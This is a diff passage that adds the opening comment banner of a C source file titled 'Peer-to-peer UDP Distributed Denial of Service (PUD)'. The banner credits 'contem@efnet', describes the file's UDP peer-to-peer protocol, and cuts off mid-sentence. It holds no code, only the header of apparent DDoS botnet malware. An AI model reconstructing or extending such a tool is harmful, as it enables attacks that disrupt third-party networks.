@@ -1,0 +1,8 @@
+/****************************************************************************
+ *                                                                          *
+ *           Peer-to-peer UDP Distributed Denial of Service (PUD)           *
+ *                         by contem@efnet                                  *
+ *                                                                          *
+ *         Virtually connects computers via the udp protocol on the         *
+ *  specified port.  Uses a newly created peer-to-peer protocol that        *
+ *  incorperates uses on unstable or dead c
